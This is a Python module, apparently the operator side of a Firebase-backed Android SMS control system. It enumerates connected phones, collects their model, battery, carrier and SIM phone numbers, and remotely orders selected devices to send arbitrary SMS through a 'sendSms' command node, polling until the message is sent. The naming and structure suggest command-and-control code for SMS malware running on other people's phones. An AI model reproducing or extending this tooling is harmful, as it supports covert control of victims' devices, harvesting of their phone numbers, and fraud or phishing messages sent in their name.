import requests
import json
import logging
from typing import List, Dict, Any, Optional
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

logger = logging.getLogger(__name__)


def _make_session() -> requests.Session:
    """Session with connection pooling + auto-retry on transient errors."""
    session = requests.Session()
    retry = Retry(
        total=2,
        backoff_factor=0.2,
        status_forcelist=[500, 502, 503, 504],
        allowed_methods=["GET", "PUT", "DELETE"],
    )
    adapter = HTTPAdapter(
        max_retries=retry,
        pool_connections=10,
        pool_maxsize=20,
    )
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    return session


class FirebaseManager:
    def __init__(self, base_url: str):
        self.base_url = base_url.strip().rstrip('/')
        # Always ensure https:// prefix regardless of domain suffix
        if self.base_url and not self.base_url.startswith('http'):
            self.base_url = f"https://{self.base_url}"
        # Persistent session — reuses TCP connections (major speed win)
        self._session = _make_session()

    def get_url(self, path: str) -> str:
        return f"{self.base_url}/{path.lstrip('/')}.json"

    def test_connection(self) -> bool:
        """Lightweight shallow ping to confirm RTDB is reachable."""
        try:
            r = self._session.get(
                f"{self.base_url}/.json?shallow=true", timeout=5
            )
            return r.status_code == 200
        except Exception as e:
            logger.error(f"Firebase connection error: {e}")
            return False

    def get_all_clients(self) -> Dict[str, Any]:
        """Fetch all clients from /clients node."""
        try:
            r = self._session.get(self.get_url('clients'), timeout=10)
            if r.status_code == 200 and r.json():
                return r.json()
            return {}
        except Exception as e:
            logger.error(f"Error fetching clients: {e}")
            return {}

    def get_client_count(self) -> int:
        """Fast count using shallow query — no full payload download."""
        try:
            r = self._session.get(
                f"{self.base_url}/clients.json?shallow=true", timeout=5
            )
            if r.status_code == 200 and r.json():
                return len(r.json())
            return 0
        except Exception:
            return 0

    def get_online_devices(self) -> List[Dict[str, Any]]:
        """
        Fetch all devices where status == online/True.
        Returns a list of formatted device dicts.
        """
        clients = self.get_all_clients()
        online_devices = []
        for dev_id, data in clients.items():
            if not isinstance(data, dict):
                continue
            status = data.get('status')
            is_online = status in (True, 'true', 1, 'online')
            if not is_online:
                continue

            sims = data.get('sims', [])
            sim_slots = []
            if isinstance(sims, list):
                for s in sims:
                    if isinstance(s, dict):
                        sim_slots.append({
                            'slot': s.get('simSlotIndex', '0'),
                            'carrier': s.get('carrierName', 'Unknown'),
                            'phone': s.get('phoneNumber', 'Unknown'),
                        })

            online_devices.append({
                'id': dev_id,
                'model': data.get('modelName', 'Unknown Phone'),
                'battery': data.get('battery', 'N/A'),
                'android_v': data.get('androidV', 'N/A'),
                'provider': data.get('service_provider', 'N/A'),
                'sims': sim_slots,
                'joined': data.get('joined', 'N/A'),
            })

        return online_devices

    def send_sms_command(
        self, device_id: str, to_number: str, message: str, sim_slot: int = 0
    ) -> bool:
        """
        Write sendSms command to Firebase:
        /clients/{device_id}/webhookEvent/sendSms
        """
        payload = {
            "from": int(sim_slot),
            "isSended": False,
            "message": message,
            "to": to_number.strip(),
        }
        try:
            r = self._session.put(
                self.get_url(f"clients/{device_id}/webhookEvent/sendSms"),
                json=payload,
                timeout=6,
            )
            return r.status_code == 200
        except Exception as e:
            logger.error(f"send_sms_command error ({device_id}): {e}")
            return False

    def clear_sms_command(self, device_id: str) -> bool:
        """Delete the sendSms node so the device slot is free immediately."""
        try:
            r = self._session.delete(
                self.get_url(f"clients/{device_id}/webhookEvent/sendSms"),
                timeout=4,
            )
            return r.status_code == 200
        except Exception as e:
            logger.error(f"clear_sms_command error ({device_id}): {e}")
            return False

    def get_sms_status(self, device_id: str) -> Optional[Dict[str, Any]]:
        """Read current sendSms state for isSended polling."""
        try:
            r = self._session.get(
                self.get_url(f"clients/{device_id}/webhookEvent/sendSms"),
                timeout=4,
            )
            if r.status_code == 200:
                return r.json()
            return None
        except Exception as e:
            logger.error(f"get_sms_status error ({device_id}): {e}")
            return None
